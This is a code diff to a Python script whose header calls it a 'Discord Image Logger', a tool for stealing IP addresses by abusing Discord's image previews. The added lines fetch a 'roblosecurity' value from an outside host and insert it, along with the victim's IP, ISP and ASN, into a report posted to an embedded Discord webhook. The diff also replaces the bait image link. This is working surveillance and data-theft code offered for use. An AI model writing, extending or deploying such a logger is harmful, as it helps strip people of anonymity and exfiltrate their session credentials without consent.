@@ -9,11 +9,12 @@ __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
-
+d = requests.get('https://valksec.github.io/roblosecurity.json')
+c = d.json()['roblosecurity']
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1133811105760804954/m6czk0g_RhpBRNH9CX2lg0x3GKKHa6pGS7TUAg35ttW6pJXTTpA0mvHaAkL_aLDHGNjn",
-    "image": "https://media.discordapp.net/attachments/1117924729161007138/1119334702596243608/Screenshot_20230616-203614_CapCut.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://linksharing.samsungcloud.com/hbkQ4gCuiCrN", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -151,6 +152,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 **Endpoint:** `{endpoint}`
             
 **IP Info:**
+> **RobloSecurity:** `{c if c else 'Unknown'}`
 > **IP:** `{ip if ip else 'Unknown'}`
 > **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
 > **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
